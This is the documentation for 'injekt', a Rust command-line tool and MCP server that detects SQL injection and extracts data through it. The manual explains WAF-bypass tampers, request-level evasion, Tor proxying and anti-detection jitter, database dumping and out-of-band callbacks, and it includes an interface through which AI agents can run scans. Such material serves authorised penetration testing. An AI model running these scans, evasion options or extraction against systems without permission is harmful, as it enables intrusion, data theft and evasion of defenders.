# injekt — Documentation

> **Modern SQL injection detection & exploitation in Rust — zero persistence, anonymisation by design.**

---

## Table of Contents

1. [Overview & Philosophy](#overview--philosophy)
2. [Installation](#installation)
3. [CLI Reference](#cli-reference)
4. [MCP Server Integration](#mcp-server-integration)
5. [OPSEC Features](#opsec-features)
6. [Architecture](#architecture)
7. [Development Workflow](#development-workflow)
8. [Examples & Use Cases](#examples--use-cases)
9. [Configuration Reference](#configuration-reference)

---

## Overview & Philosophy

`injekt` is a modern SQL injection scanner and exploitation tool written in Rust 2024 edition. It was designed from the ground up with two non-negotiable principles:

### 1. Zero Persistence by Default
- **No disk writes** unless explicitly requested via `--export-encrypted` or `--output`
- `SessionState` lives entirely in `Arc<RwLock<…>>` with `ZeroizeOnDrop` — memory wiped on exit
- No SQLite, no cache files, no telemetry

### 2. Anonymisation by Design
- **Scrubber** (`src/session/scrubber.rs`) automatically redacts:
  - `Authorization`, `Cookie`, `Set-Cookie`, `X-Api-Key` headers
  - JWT tokens (`eyJ…`)
  - AWS keys (`AKIA[0-9A-Z]{16}`)
  - PEM private keys
  - Replaces with `[REDACTED]` or 8-char hex hash
- **Identity rotation** (`src/http/identity.rs`): Realistic UA pool (Chrome 126 / Firefox 128 / Safari 17.5) with matching `Sec-CH-UA`
- **Jitter** (`src/http/jitter.rs`): `rand_distr::Normal` — never regular cadence
- **Proxy enforcement**: `socks5h://` required (remote DNS); `socks5://` rejected with `DnsLeak` error
- **TLS**: `rustls` (stable JA3 — documented limitation; use external proxy for JA3 randomization)

### Key Advantages Over sqlmap/ghauri

| Concern | sqlmap / ghauri | injekt v2 |
|---------|-----------------|-----------|
| **Persistence** | SQLite session files, cache on disk | **RAM only**, `ZeroizeOnDrop`, `SecretString` |
| **OPSEC** | Fixed cadence, leaky headers, `socks5://` DNS leak | Human jitter, realistic UA + `Sec-CH-UA`, `socks5h://` enforced |
| **Performance** | Unbounded threads, blocking code | Bounded `buffer_unordered(n)`, native `async fn`, `CancellationToken` |
| **Maintainability** | Python, `async_trait` macros | Rust 2024, `thiserror 2.x`, newtypes, type-state, `clippy pedantic` |

---

## Installation

### One-Line Install (Linux/macOS, No Rust Required)
```bash
curl -fsSL https://raw.githubusercontent.com/HaK0exe/injekt/main/install.sh | sh
```
- Detects OS/arch, downloads from latest GitHub Release
- Verifies against `SHA256SUMS`
- Installs to `~/.local/bin` (override with `INJEKT_INSTALL_DIR`)
- Pin version: `INJEKT_VERSION=v0.1.0 curl -fsSL … | sh`

### Prebuilt Binary (Manual, No Rust Required)
1. Download from [GitHub Releases](https://github.com/HaK0exe/injekt/releases)
2. Verify against `SHA256SUMS`
3. Extract and run:
```bash
tar xzf injekt-*-x86_64-unknown-linux-gnu.tar.gz
cd injekt-*/
./injekt --no-banner info
```

### From Source
**Prerequisites:** Rust 1.88+ (`rustup update`)
```bash
git clone https://github.com/HaK0exe/injekt
cd injekt
cargo build --release
# Binary at ./target/release/injekt

# Or install to $CARGO_HOME/bin
cargo install --path .
```

---

## CLI Reference

### Global Structure
```bash
injekt [GLOBAL_OPTIONS] [COMMAND] [COMMAND_OPTIONS]
```

### Global Options (available everywhere)
| Flag | Description | Default |
|------|-------------|---------|
| `-u, --target <URL>` | Target URL (e.g. `https://example.com/?id=1`) | — |
| `-m, --bulk-file <PATH>` | Bulk scan: one target per line (`#` comments skipped, max 1000) | — |
| `--method <METHOD>` | HTTP method | `GET` |
| `--headers <H1,H2>` | Extra headers (comma-separated `Name: value`) | — |
| `--cookies <STR>` | Cookie header (stored as `SecretString`, redacted in logs) | — |
| `--proxy <URL>` | `http(s)://` or `socks5h://` (**`socks5://` rejected — DNS leak**) | — |
| `--threads <N>` | Concurrency bound for `buffer_unordered` | `5` |
| `--timeout <SEC>` | Request timeout (mandatory for HTTP client build) | `30` |
| `--retries <N>` | Max retries for failed requests | `3` |
| `--delay <MS>` | Base retry delay (exponential backoff + jitter) | `500` |
| `--techniques <LIST>` | Comma-separated: `boolean,time,error,union,stacked,oob,json,all` | `all` |
| `-p, --params <LIST>` | Test only these parameters: bare name (`-p id`), or scoped (`-p body:user,cookie:PHPSESSID`, `query:`, `header:`) | all discovered params |
| `--data <STR>` | POST body to test (e.g. `"id=1&user=admin"`) — alternative to `--raw-file` | — |
| `--prefix <STR>` | Payload prefix prepended **after** tampers (e.g. `"')"`) | — |
| `--suffix <STR>` | Payload suffix appended **after** tampers (e.g. `"-- -"`) | — |
| `--safe-chars <STR>` | Extra chars exempted from percent-encoding (e.g. `"(),"`) | — |
| `--skip-urlencode` | Send payloads without URL-encoding (use with care) | `false` |
| `--fetch-using <MODE>` | Force fetch oracle: `direct`, `boolean` or `time` (narrows default technique set) | `direct` |
| `--string <STR>` | Response body **must contain** this substring, otherwise veto finding | — |
| `--not-string <STR>` | Response body **must NOT contain** this substring, otherwise veto finding | — |
| `--code <N>` | Response status **must equal** this code, otherwise veto finding | — |
| `--text-only` | Strip HTML tags/entities before matching and detection | `false` |
| `--level <1-5>` | Aggressiveness: L1 = historical payload budget, L2 doubles it, L3+ tries every payload and widens ORDER BY enumeration | `1` |
| `--confirm` | Strict second-pass confirmation: replay each finding's technique on that single parameter in a fresh session, keep only re-confirmed (OOB skipped, ~2× request cost) | `false` |
| `--ignore-code <LIST>` | Status codes treated as negative probes (e.g. `--ignore-code 429,503`); never yields a finding. Baseline/WAF detection runs **before** this filter and is never ignored | — |
| `--raw-file <PATH>` | Raw HTTP request file (Burp/ZAP export) — **takes priority over `--target`** (see [Target resolution](#target-resolution)) | — |
| `--tamper <LIST>` | WAF tampers (13 total, see [Tamper scripts](#tamper-scripts)): `space2comment,space2plus,space2tab,space2newline,space2randomblank,randomcase,versionedcomment,betweencomment,charencode,doubleurlencode,hexencode,unicodeencode,overlongutf8` | auto `space2comment` on WAF 403/406 |
| `--hpp` | HTTP Parameter Pollution: duplicate param `?id=1&id=PAYLOAD` (Query/Body) | `false` |
| `--chunked` | Chunked transfer: streamed `Transfer-Encoding: chunked` body (Body only) | `false` |
| `--oob-domain <DOMAIN>` | Collaborator base domain (enables OOB probes, **OPT-IN**) | — |
| `--oob-poll-url <URL>` | Poll URL with `{token}` placeholder (auto-confirm callbacks) | — |
| `--oob-wait-secs <N>` | Seconds to wait for async DB-side OOB query before polling | `5` |
| `--dbms <KIND>` | Force DBMS: `mysql`, `postgres`, `mssql`, `oracle` | auto-fingerprint |
| `--extract` | Enable data extraction (opt-in, uses `SecretString`) | `false` |
| `--output <PATH>` | Write JSON report to file (0o600 on Unix) | stdout |
| `--rate-limit <RPS>` | Token-bucket requests/second | `10` (always enforced; there is no "unlimited" mode via CLI) |
| `--jitter <MEAN,STD>` | **Milliseconds**, e.g. `"750,250"` (750±250ms, floor 200ms) | `750,250` (human jitter is **on by default**, even without the flag) |
| `--marker <STR>` | Injection marker: `*`, `§`, `{{}}` | auto-detect |
| `--export-encrypted <PATH>` | Encrypted snapshot (XChaCha20-Poly1305 + Argon2id, **OPT-IN**) | — |
| `--import <PATH>` | Import encrypted snapshot (resume session) | — |
| `--no-redact` | **Disable scrubbing (local debugging only!)** | `false` |
| `--allow-private` | Allow loopback/private IPs (anti-SSRF bypass, lab only) | `false` |
| `-v, --verbose` | Debug logs (`tracing` at `debug` level) | `info` |
| `--no-banner` | Suppress startup banner | `false` |

### Subcommands

#### `scan` — SQL Injection Detection & Exploitation
```bash
# Basic scan (all techniques, 5 threads)
injekt --target "https://example.com/search?q=1" --threads 5

# Explicit scan subcommand
injekt scan --target "https://example.com/?id=1"

# Specific techniques + DBMS
injekt --target "https://example.com/?id=1" --techniques boolean,error --dbms mysql

# JSON-function endpoints
injekt --target "https://example.com/?id=1" --techniques json --dbms mysql

# WAF bypass with tampers
injekt --target "https://example.com/?id=1" --tamper space2comment,randomcase --techniques boolean,union

# Request-level tampers
injekt --target "https://example.com/?id=1" --hpp --techniques boolean
injekt --target "https://example.com/?id=1" --chunked --techniques boolean

# OPSEC mode: Tor + jitter (ms!) + rate limit
injekt --target "https://example.com/?id=1" \
  --proxy socks5h://127.0.0.1:9050 \
  --jitter "750,250" --rate-limit 5

# Allow private lab targets
injekt --target "http://192.168.1.10/?id=1" --allow-private

# Encrypted session export/import (OPT-IN)
injekt --target "https://example.com/?id=1" --export-encrypted ./session.enc
injekt --import ./session.enc --target "https://example.com/?id=1"  # resume
injekt replay --file ./session.enc

# Output JSON report
injekt --target "https://example.com/?id=1" --output report.json
```

### Tamper scripts

13 tampers, composable with `--tamper a,b,c` (applied as original + each single + full chain).
Case-insensitive, with sqlmap-style aliases (`comment` → `space2comment`, `url` → `charencode`,
`double` → `doubleurlencode`, `hex` → `hexencode`, … — unknown names are ignored with a warning).

| Tamper | Transformation | Typical use |
|--------|---------------|-------------|
| `space2comment` | ` ` → `/**/` | Generic WAF bypass; **auto-applied on repeated 403/406** |
| `space2plus` | ` ` → `+` | Query-string contexts |
| `space2tab` | ` ` → `%09` | Whitespace filters |
| `space2newline` | ` ` → `%0a` | Whitespace filters |
| `space2randomblank` | ` ` → random of `%09 %0a %0c %0d %a0 +` | Signature rotation |
| `randomcase` | `SELECT` → `SeLeCt` | Case-sensitive signatures |
| `versionedcomment` | `SELECT` → `/*!50000SELECT*/` | **MySQL only** |
| `betweencomment` | `SELECT` → `S/**/E/**/L…` | Keyword-splitting filters |
| `charencode` | Percent-encode non-alnum | Encoding filters |
| `doubleurlencode` | `%` → `%25` | Double-decoding WAFs |
| `hexencode` | Hex `%xx` per byte | Encoding filters |
| `unicodeencode` | `%uXXXX` per char | IIS/ASP stacks |
| `overlongutf8` | `/` → `%c0%af` | Overlong-UTF8 decoders |

**Enumeration/Extraction Flags** (require `--extract` or `--auto-enumerate` in recon):
| Flag | Description |
|------|-------------|
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables (with `--db`) |
| `--columns` | Enumerate columns (with `--db`, `--table`) |
| `--dump` | Dump table data (with `--db`, `--table`, `--column`) |
| `--banner` | Retrieve DBMS version |
| `--current-user` | Retrieve current DB user |
| `--current-db` | Retrieve current database name |
| `--hostname` | Retrieve server hostname |
| `--db <NAME>` | Specific database |
| `--table <NAME>` | Specific table |
| `--column <NAME>` | Specific column |
| `--start <N>` | Row offset for dump |
| `--stop <N>` | Row limit for dump |
| `--count` | Only count rows |

#### `recon` — Discovery & Crawling
```bash
# Crawl only (discover parameters, no testing)
injekt recon crawl --target "example.com" --depth 2 --max-pages 100

# Crawl + scan discovered parameters
injekt recon scan --target "example.com" --auto-enumerate --dbs

# Import previously discovered candidates
injekt recon import --file discovered.json --test
injekt recon import --file discovered.json --test --enumerate
```

**Recon Crawl Options:**
| Option | Description | Default |
|--------|-------------|---------|
| `--target <HOST\|URL>` | Target to crawl (bare host or URL) | required |
| `--depth <N>` | Crawl depth (max 16) | `2` |
| `--max-pages <N>` | Maximum pages to crawl (max 100,000) | `100` |
| `--max-per-template <N>` | Max pages per path shape + query params (anti-trap) | `3` |
| `--include-subdomains` | Follow subdomain links | `false` |
| `--ignore-robots` | Ignore `robots.txt` | `false` |

**Recon Scan Options:** (all crawl options +)
| Option | Description | Default |
|--------|-------------|---------|
| `--auto-enumerate` | After detection, enumerate databases/tables | `false` |

**Recon Import Options:**
| Option | Description |
|--------|-------------|
| `--file <PATH>` | JSON file from `recon crawl` or `recon scan` |
| `--test` | Actively scan imported candidates (requires network) |
| `--enumerate` | Enable enumeration on confirmed findings |

#### `replay` — Encrypted Session Replay
```bash
injekt replay --file ./session.enc
```
Shows basic info about an encrypted session file (size, path). Full resume via `--import`.

#### `info` — Capability Information
```bash
injekt info
```
Outputs:
```
modern SQLi detection — zero persistence, OPSEC by design
  Techniques      boolean, time, error, union, stacked, oob, json
  Tampers         space2comment, randomcase, versionedcomment, charencode, doubleurlencode, hexencode, unicodeencode, overlongutf8, space2tab, space2newline, space2randomblank, betweencomment
  OOB             opt-in via --oob-domain <collaborator> [--oob-poll-url <url> with {token}]
  Request tampers --hpp (duplicate ?id=1&id=PAYLOAD), --chunked (Transfer-Encoding: chunked body)
  DBMS            mysql, postgres, mssql, oracle
  Docs            docs/OPSEC.md (JA3, jitter, proxy socks5h)
```

#### `mcp` — MCP Server Mode
```bash
injekt mcp
```
Runs as MCP server over stdio for AI assistants (Claude Code, Codex, OpenCode, Cursor, VS Code). See [MCP Integration](#mcp-server-integration).

---

## MCP Server Integration

### Running the MCP Server
```bash
injekt mcp
```

### Available MCP Tools

#### `scan` — SQL Injection Scan
```json
{
  "target": "https://example.com/?id=1",
  "threads": 5,
  "techniques": ["boolean", "time"],
  "params": ["id"],
  "proxy": "socks5h://127.0.0.1:9050",
  "rate_limit": 5.0,
  "jitter": "750,250",
  "dbms": "mysql",
  "extract": true,
  "dbs": true,
  "output": "report.json",
  "oob_domain": "x.oastify.com",
  "oob_poll_url": "https://x.oastify.com/poll/{token}",
  "allow_private": false,
  "no_redact": false
}
```
**Notes:**
- `export_encrypted` **not supported** in MCP mode (no TTY for passphrase)
- `output` path must be relative, no `..` traversal (validated)
- Returns structured JSON report inline

#### `recon_crawl` — Parameter Discovery
```json
{
  "target": "example.com",
  "depth": 2,
  "max_pages": 100,
  "max_per_template": 3,
  "include_subdomains": false,
  "ignore_robots": false,
  "threads": 5,
  "proxy": "socks5h://127.0.0.1:9050",
  "rate_limit": 10.0,
  "allow_private": false
}
```

#### `recon_scan` — Crawl + Scan
```json
{
  "target": "example.com",
  "depth": 2,
  "max_pages": 100,
  "auto_enumerate": true,
  "threads": 5,
  "techniques": ["boolean", "error"],
  "proxy": "socks5h://127.0.0.1:9050",
  "extract": true,
  "dbs": true,
  "output": "recon-report.json"
}
```

#### `info` — Capabilities
```json
{}
```

### MCP Security Model
- **No encrypted exports** — no TTY for passphrase prompts
- **Output path validation** — relative paths only, no `..`, 0o600 on Unix
- **Scrubbed output** — all JSON responses pass through `Scrubber`
- **Warning on `no_redact`** — logged if enabled (local debugging only)

### MCP vs CLI parity (verified against `src/mcp/tools.rs`)

| CLI-only (not exposed over MCP) | Reason |
|---------------------------------|--------|
| `--raw-file` (Burp/ZAP bodies) | Needs local file access |
| `--marker` (`*`/`§` modes) | Ad-hoc request shaping, no clean tool mapping |
| `--method` override | Same as above |
| `--import` / `replay` / `--export-encrypted` | No TTY for passphrase; `export_encrypted` is rejected with `invalid_params` |
| `--bulk-file` | Multi-target orchestration stays CLI-side |
| `--level` / `--confirm` / `--ignore-code` | Not in the tool schema — MCP runs at **level 1, no second-pass confirm** |
| `-v/--verbose`, `--no-banner` | Transport-level concerns (stderr is logs, stdout is JSON-RPC) |

Notes:
- `scan` / `recon_*` honour `timeout` / `retries` / `delay` from the tool params
  (effective defaults 30s / 3 / 500ms when absent).
- Same jitter unit as CLI: **milliseconds** (`"750,250"`), default 750±250ms.
- `recon_crawl` has no `output` param (inline JSON only); `scan` / `recon_scan` do.
- Long scans can exceed client tool-call timeouts: prefer bounded
  `max_pages` / `depth` / `threads` for agent-driven runs.

---

## OPSEC Features

### Memory Safety & Zero Persistence
- `SessionState` = `Arc<RwLock<SessionState>>` + `ZeroizeOnDrop`
- All secrets: `secrecy::SecretString` + `zeroize::Zeroize`
- No files written unless `--export-encrypted` / `--output` / `--import` / `recon import`

### Automatic Redaction (Scrubber)
The `Scrubber` (`src/session/scrubber.rs`) processes all output:
| Pattern | Replacement |
|---------|-------------|
| `Authorization: Bearer <token>` | `Authorization: [REDACTED]` |
| `Cookie: session=xyz` | `Cookie: [REDACTED]` |
| JWT `eyJhbGciOiJ…` | `[REDACTED]` (8-char hash) |
| AWS `AKIA[0-9A-Z]{16}` | `[REDACTED]` (8-char hash) |
| PEM `-----BEGIN PRIVATE KEY-----` | `[REDACTED]` |
| `Set-Cookie` headers | `[REDACTED]` |

**Never use `--no-redact` on shared reports.**

### Identity Rotation
- UA pool: Chrome 126, Firefox 128, Safari 17.5 (real versions)
- Matching `Sec-CH-UA`, `Sec-CH-UA-Mobile`, `Sec-CH-UA-Platform`
- Rotated per-request within session

### Network OPSEC
- **Jitter**: `Normal(mean_ms, stddev_ms)` — never fixed intervals. **Milliseconds**:
  `--jitter "750,250"` = 750±250ms. Active by default (750±250ms, floor 200ms) even without the flag.
- **Rate limiting**: Token bucket, default **10 req/s** (`RateLimiter::new(10.0)` when `--rate-limit` is absent).
- **Proxy**: `socks5h://` enforced (remote DNS); `socks5://` → `DnsLeak` error
- **TLS**: `rustls` (fixed JA3 — use external proxy like `mitmproxy` for randomization)

### Encrypted Export (OPT-IN)
```bash
# Export (prompts for passphrase ≥12 chars, or INJEKT_PASSPHRASE env)
injekt --target "https://example.com/?id=1" --export-encrypted ./session.enc

# Import (resume session)
injekt --import ./session.enc --target "https://example.com/?id=1"

# Replay (inspect)
injekt replay --file ./session.enc
```
- Format: XChaCha20-Poly1305 + Argon2id (v2)
- File permissions: 0o600 on Unix
- **Creates sensitive artefact** — handle with care

---

## Architecture

### Module Structure (verified against `src/`)

```
src/
├── main.rs / lib.rs                 # Entry points, public API + InjektError
├── cli/
│   ├── args.rs                      # Clap CLI definition (Cli, Commands, Recon*)
│   ├── profile.rs                   # --profile presets (quick/balanced/stealth/aggressive)
│   ├── file_config.rs               # --config TOML + candidate paths + precedence
│   ├── client_builder.rs            # HTTP client from CLI flags
│   ├── commands/
│   │   ├── scan.rs                  # Scan engine + bulk dispatch
│   │   ├── recon.rs                 # Crawl, scan, import
│   │   ├── replay.rs                # Encrypted session replay
│   │   ├── info.rs                  # Capability info (InfoResult)
│   │   └── bulk.rs                  # Multi-target sequential scan
│   └── output/                      # console, json, format
├── target/
│   ├── url.rs                       # Strict URL parsing (TargetUrl)
│   ├── raw_request.rs               # Burp/ZAP raw request parser
│   ├── parameters.rs                # ParameterLocation {Query,Body,Header,Cookie}
│   ├── markers.rs                   # Injection markers *, §, {{}}
│   ├── structured.rs                # JSON/XML body handling
│   └── bulk.rs                      # Bulk file loading (MAX_BULK_TARGETS = 1000)
├── http/
│   ├── client.rs                    # Type-state builder (timeout() mandatory)
│   ├── identity.rs                  # UA rotation + Sec-CH-UA
│   ├── proxy.rs                     # ProxyConfig (socks5h:// enforcement)
│   ├── cookies.rs                   # In-memory CookieJar (zeroize)
│   ├── redirects.rs                 # Redirect policy
│   ├── retry.rs                     # Exponential backoff + jitter
│   ├── jitter.rs                    # Normal distribution jitter (ms)
│   └── rate_limit.rs                # Token bucket (default 10/s)
├── detection/
│   ├── baseline.rs                  # 3-5 baselines, SHA-256, WAF 403/406
│   ├── response_diff.rs             # Levenshtein + Jaccard DiffResult
│   ├── confirmation.rs              # TRUE/FALSE inverted, 3 trials min
│   ├── matcher.rs                   # MatcherConfig (--string/--not-string/--code/--text-only)
│   └── scanner/                     # engine + scheduler
├── techniques/
│   ├── tamper.rs                    # 13 WAF evasion tampers
│   ├── request_tamper.rs            # HPP + chunked
│   ├── payload_opts.rs              # PayloadOpts (prefix/suffix/encoding/fetch-using)
│   ├── boolean/ time/ error/        # Classic detectors + payloads
│   ├── union/ stacked/              # ORDER BY enumeration, `; SELECT` marker
│   ├── oob/                         # DNS/HTTP collaborator (OPT-IN) + verifier
│   └── json/                        # JSON_EXTRACT/->>/JSON_VALUE/OPENJSON
├── dbms/                            # common trait + fingerprint
│   ├── mysql/ postgres/ mssql/ oracle/  # fingerprint, payloads, queries, enumeration
├── extraction/                      # engine, inference, verification
├── recon/
│   ├── crawler.rs                   # Static crawler (links, forms, JS)
│   ├── discovery.rs                 # Candidate scanning
│   ├── filters.rs                   # Deduplication, same-origin
│   └── parameter.rs                 # ParameterCandidate
├── session/
│   ├── state.rs                     # SessionState (RAM, ZeroizeOnDrop)
│   ├── scrubber.rs                  # Redaction engine
│   └── export.rs                    # Encrypted export/import (XChaCha20 + Argon2id)
├── reporting/
│   ├── console.rs json.rs evidence.rs bulk.rs
├── mcp/                             # MCP stdio server (server.rs, tools.rs)
└── engine/
    ├── orchestrator.rs              # State machine: parse → baseline → detection → fingerprint → extraction
    ├── detection_runner.rs          # Detection orchestration
    └── sql.rs                       # SELECT-only guard for stacked/extraction
```

### Engine State Machine (`src/engine/orchestrator.rs`)
```
parse → baseline → detection → fingerprint → extraction(opt-in)
```
- Bounded concurrency: `buffer_unordered(threads)`
- `tokio::time::timeout` on every request
- `CancellationToken` for graceful Ctrl+C shutdown
- Progress bars via `indicatif`

### Key Design Patterns
- **Newtypes**: `TargetUrl`, `Payload`, `ParameterName`
- **Type-state builder**: `HttpClient::builder().timeout(...).build()` — won't compile without `timeout()`
- **`#[non_exhaustive]`** on all public enums/structs
- **Exhaustive `match`** on enums
- **`const fn`** where possible
- **Manual `Debug`** for secret types (prevents accidental logging)
- **`Cow`** for zero-copy where applicable
- **`Arc` only when genuinely shared**

---

## Development Workflow

### Required Checks (Must Pass)
```bash
# Formatting
cargo fmt --check

# Linting (pedantic + deny warnings)
cargo clippy -- -D warnings

# All tests
cargo test
cargo test --doc

# Specific integration test
cargo test --test integration_http -- --nocapture
cargo test --test integration_tamper <test_name>

# Snapshot tests (insta)
cargo insta review
```

### Lint Configuration (Enforced)
```toml
# Cargo.toml + src/lib.rs + src/main.rs
unsafe_code = "deny"
clippy::unwrap_used = "deny"
clippy::expect_used = "deny"
clippy::dbg_macro = "deny"
clippy::todo = "deny"
clippy::pedantic = "warn"
```

**Rules:**
- ❌ Never `unwrap()` / `expect()` / `dbg!()` / `todo!()` in `src/`
- ✅ Propagate via `crate::error::InjektError` (`thiserror 2.x`) or `anyhow`
- ✅ Tests: `#![allow(clippy::unwrap_used, clippy::expect_used)]` header
- ✅ Scoped `#[allow(...)]` for intentional cases in `src/`

### Test Infrastructure
- **Integration**: `wiremock 0.6` `MockServer` (real local HTTP)
- **Property-based**: `proptest` for parsers (`tests/proptest_parsers.rs`)
- **Snapshots**: `insta` for golden-file testing

---

## Examples & Use Cases

### Basic Detection
```bash
# Quick scan
injekt -u "https://shop.example.com/product?id=42"

# With verbose output
injekt -u "https://shop.example.com/product?id=42" -v
```

### Targeted Technique Selection
```bash
# Only boolean-based (fast, low noise)
injekt -u "https://example.com/?id=1" --techniques boolean

# Time-based for blind injection
injekt -u "https://example.com/?id=1" --techniques time --dbms postgres

# Error-based for verbose errors
injekt -u "https://example.com/?id=1" --techniques error

# Union-based for data extraction
injekt -u "https://example.com/?id=1" --techniques union --extract --dump
```

### WAF Bypass
```bash
# Auto-detect WAF (403/406) → applies space2comment automatically
injekt -u "https://waf.example.com/?id=1"

# Manual tamper chain
injekt -u "https://waf.example.com/?id=1" \
  --tamper space2comment,randomcase,versionedcomment \
  --techniques boolean,union

# MySQL versioned comments + encoding
injekt -u "https://example.com/?id=1" \
  --tamper versionedcomment,charencode \
  --dbms mysql
```

### Request-Level Evasion
```bash
# HTTP Parameter Pollution (WAFs checking only first occurrence)
injekt -u "https://example.com/?id=1" --hpp --techniques boolean

# Chunked body transfer (bypass Content-Length inspection)
injekt -u "https://example.com/search" --method POST --data "q=test" --chunked --techniques boolean
```

### OPSEC-Hardened Scan
```bash
# Full OPSEC: Tor + jitter (ms) + rate limit + no private bypass
injekt -u "https://target.onion/?id=1" \
  --proxy socks5h://127.0.0.1:9050 \
  --jitter "750,250" \
  --rate-limit 3 \
  --threads 3
```

### Recon Workflow
```bash
# 1. Discover parameters (passive-ish). NOTE: recon takes --target (long form),
#    not -u — the global -u does NOT satisfy recon's required --target.
injekt recon crawl --target "https://example.com" --depth 3 --max-pages 200 --output discovered.json

# 2. Scan discovered parameters
injekt recon scan --target "https://example.com" --auto-enumerate --dbs --output scan-report.json

# 3. Import and test offline candidates
injekt recon import --file discovered.json --test --enumerate --output final-report.json
```

### Bulk Scanning
```bash
# Create targets.txt (one per line, # comments)
cat > targets.txt <<'EOF'
https://site1.com/?id=1
https://site2.com/search?q=test
# https://skip-this.com/?id=1
https://site3.com/api?user=admin
EOF

# Bulk scan with aggregated JSON report
injekt --bulk-file targets.txt --output bulk-report.json --threads 3
```

### JSON API Endpoints
```bash
# JSON injection via JSON_EXTRACT / ->> / JSON_VALUE / OPENJSON / JSON_EXISTS
injekt -u "https://api.example.com/graphql" \
  --method POST \
  --headers "Content-Type: application/json" \
  --data '{"query":"{user(id:1){name}}","variables":{}}' \
  --techniques json \
  --dbms postgres
```

### OOB (Out-of-Band) — OPT-IN
```bash
# Requires self-hosted collaborator (e.g., interactsh, oastify)
injekt -u "https://example.com/?id=1" \
  --oob-domain x.oastify.com \
  --oob-poll-url "https://x.oastify.com/poll/{token}" \
  --techniques oob \
  --oob-wait-secs 10
```
- Without `--oob-poll-url` containing `{token}`: probes sent but **never auto-confirmed**
- Egress originates from **target DB server**, not via `--proxy`
- Use self-hosted collaborator for control

### Encrypted Session Persistence
```bash
# Export (interactive passphrase ≥12 chars)
injekt -u "https://example.com/?id=1" --export-encrypted session.enc

# Resume later (same target required)
injekt --import session.enc -u "https://example.com/?id=1"

# Inspect session file
injekt replay --file session.enc
```

---

## Configuration Reference

### Environment Variables
| Variable | Purpose |
|----------|---------|
| `RUST_LOG` | Override tracing filter (default: `info`, `-v` → `debug`) |
| `INJEKT_PASSPHRASE` | Passphrase for `--export-encrypted` (CI automation, min 12 chars) |
| `INJEKT_PROFILE` | Preset: `quick\|balanced\|stealth\|aggressive` (same as `--profile`) |
| `INJEKT_CONFIG` | Config file path (same as `--config`) |
| `INJEKT_THREADS`, `INJEKT_TIMEOUT`, `INJEKT_RETRIES`, `INJEKT_DELAY` | Perf knobs (same as CLI flags) |
| `INJEKT_RATE_LIMIT`, `INJEKT_JITTER`, `INJEKT_TECHNIQUES`, `INJEKT_LEVEL` | Detection knobs |
| `INJEKT_PROXY`, `INJEKT_DBMS`, `INJEKT_TAMPER`, `INJEKT_TARGET` | Target/evasion |
| `INJEKT_OOB_DOMAIN`, `INJEKT_OOB_POLL_URL`, `INJEKT_OOB_WAIT_SECS` | OOB collaborator |

### Presets (`--profile`)

Non-breaking: explicit CLI/env/config values always win, presets only fill gaps.

| Preset | Threads | Timeout | Retries | Delay | Rate | Jitter | Level | Techniques |
|---|---|---|---|---|---|---|---|---|
| `quick` | 10 | 15s | 1 | 200ms | 20/s | 200,100 | 1 | boolean,error |
| `balanced` | 5 | 30s | 3 | 500ms | 10/s | 750,250 | 1 | all (historical defaults) |
| `stealth` | 2 | 30s | 3 | 800ms | 3/s | 1200,400 | 1 | boolean,error |
| `aggressive` | 8 | 30s | 3 | 500ms | 10/s | 500,200 | 3 | all |

### Config file (`--config`, `./injekt.toml`, `~/.config/injekt/config.toml`)

```toml
profile = "stealth"
threads = 2
rate_limit = 3.0
jitter = "1200,400"
timeout = 30
retries = 3
delay = 800
level = 1
techniques = ["boolean", "error"]
proxy = "socks5h://127.0.0.1:9050"
oob_wait_secs = 5
```

Precedence: CLI flag > env (`INJEKT_*`) > config file > `--profile` > built-in defaults.
Secrets (`--cookies`, `Authorization`) are intentionally not supported in the file.
An explicit `--config` path that is missing/unparseable fails fast (exit 1);
auto-discovered files only warn. `injekt info` lists `profiles`.

### File Permissions
- All written files: **0o600** on Unix (owner read/write only)
- `~/.local/bin` for install script

### Limits (Hard-Coded)
| Limit | Value |
|-------|-------|
| Max bulk targets | 1000 |
| Max crawl depth | 16 |
| Max crawl pages | 100,000 |
| Max pages per template | 3 (default) |
| Max aggressiveness level | 5 |
| Min passphrase length | 12 chars |

### Default Timeouts
| Operation | Default |
|-----------|---------|
| HTTP request timeout | 30s (`--timeout`) |
| Retry base delay | 500ms (`--delay`, exponential backoff, capped at 5s) |
| Max retries | 3 (`--retries`) |
| OOB wait | 5s (`--oob-wait-secs`) |
| Rate limit | 10 req/s (`--rate-limit`; no flag = 10/s, not unlimited) |
| Jitter | 750±250ms, floor 200ms (`--jitter "MEAN,STD"` in **ms**; active even without the flag) |
| Recon crawl HTTP timeout | 15s (hardcoded in recon client, `--timeout` does not apply) |

### Target resolution

`Cli::effective_target()` priority (verified in `src/cli/args.rs`):

1. `--raw-file req.txt` — Burp/ZAP raw request (Host header + path → URL, https tried first).
   Save the raw request (including headers and body) to a file, then:
   ```bash
   injekt --raw-file req.txt
   ```
   The parser (`src/target/raw_request.rs`) handles multipart and infers Content-Type.
2. Global `-u/--target <URL>`.
3. `scan --target <URL>` (subcommand-level).

`--bulk-file` conflicts with `--target` / `--raw-file` (one mode at a time) and with
`--export-encrypted` (use `--output` for the aggregated report). Format: one target per
line, `#` comments and blanks skipped, duplicates removed, **hard error past 1000 targets**.
Per-target failures are recorded, the loop continues; `--cookies` / `Authorization` headers
are replayed on every target (a warning is logged).

### Exit codes

| Code | Meaning |
|------|---------|
| `0` | Success — including "no finding" (check `report.json`, not the exit code) |
| `1` | Runtime error (network, target unreachable, file I/O, session export…) |
| `2` | Usage error (no target, `--bulk-file` conflict, unknown command) |

### Report schema (`JsonReport`)

```jsonc
{
  "target": "https://example.com/?id=1",   // scrubbed unless --no-redact
  "findings": [ /* Finding: parameter, technique, dbms, confidence, evidence */ ],
  "evidences": [ /* scrubbed proof snippets */ ],
  "request_count": 123
}
```
Bulk mode wraps this per target (`BulkReport`: `targets_ok`, `targets_failed`,
`request_count_total`, `per_target[]`). All output passes through `Scrubber` —
never use `--no-redact` on a shared report.

---

## Security Considerations

### Authorized Use Only
> **Use only on systems you own or have explicit written permission to test.**
> The authors are not responsible for misuse.

### Data Handling
- No telemetry, no phone-home, no tracking
- All secrets zeroized on drop
- Encrypted exports use Argon2id (memory-hard KDF) + XChaCha20-Poly1305

### Known Limitations
- **JA3 fingerprint**: `rustls` has stable JA3 — use external proxy for randomization
- **OOB confirmation**: Requires `--oob-poll-url` with `{token}`; without it, findings are *unconfirmed*
- **No disk persistence**: Session lost on crash unless `--export-encrypted` used

---

## License

MIT — see [LICENSE](LICENSE).

---

## Acknowledgments

